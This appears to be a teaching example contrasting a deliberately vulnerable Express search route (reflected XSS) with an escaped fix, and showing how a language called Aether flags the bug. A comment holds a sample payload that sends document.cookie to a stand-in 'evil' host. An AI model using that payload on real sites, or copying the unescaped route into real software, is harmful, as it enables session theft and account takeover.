// Real-world shape — reflected XSS (CWE-79), the OWASP #2 risk and the
// most-reported web vulnerability class. Express is the dominant Node web
// framework (~30M downloads/week). The bug: a query parameter is
// concatenated into the HTML response with no escaping, so a payload like
//   ?q=<script>document.location='//evil/'+document.cookie</script>
// runs in the victim's browser (session theft, account takeover).
//
// CWE-79. Countless CVEs across every framework; the pattern below is
// copy-pasted into real apps constantly.

const express = require("express");
const app = express();

// Vulnerable: the search term is reflected into HTML unescaped.
app.get("/search", (req, res) => {
  const q = req.query.q || "";
  res.send("<h1>Results for " + q + "</h1>");          // <-- CWE-79
});

// Fixed: escape the untrusted value before it reaches the HTML body.
const escapeHtml = require("escape-html");
app.get("/search-safe", (req, res) => {
  const q = req.query.q || "";
  res.send("<h1>Results for " + escapeHtml(q) + "</h1>");
});

// In Aether the request value is marked Untrusted at the boundary and the
// HTML sink refuses it unescaped:
//   res.send("<h1>..." + q)          <-> htmlResponse("<h1>..." + q)            -> E0725
//   res.send("<h1>..." + escapeHtml(q)) <-> htmlResponse("<h1>..." + htmlEscape(q)) -> clean
// See vulnerable.aeth / fixed.aeth.
